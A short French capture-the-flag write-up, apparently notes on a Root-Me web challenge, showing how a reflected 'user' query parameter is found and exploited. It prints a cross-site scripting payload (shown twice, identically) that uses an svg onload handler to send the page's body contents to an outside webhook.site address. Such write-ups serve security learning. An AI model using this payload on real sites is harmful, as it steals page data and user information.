
![](../img/Pasted%20image%2020260814235635.png)


Dans ce challenge nous pouvons voir qu'il faudra exfiltrez le contenu d'une page. 

Nous allons tout d'abord voir ce qu'il y a sur le site et comment il se présente.


Page principale : 

![](../../Pasted%20image%2020260815001110.png)

Voyons voir ce qu'il se passe lorsqu'on rentre dans le input une valeur de teste par exemple "test".

![](../../Pasted%20image%2020260815001158.png)

Nous pouvons voir actuellement que dans l'URL du site il y a un paramètre de requête nommer user qui à pour valeur l'input qu'on viens de mettre. 

Image explicatif de semrush.com : 

![](../../Pasted%20image%2020260815001358.png)



![](../../Pasted%20image%2020260815000649.png)


Première tentative de payload : 
```html
http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='//webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(document.body.innerHTML))">
```



Nouveau Payload

```html
http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='//webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(document.body.innerHTML))">
```

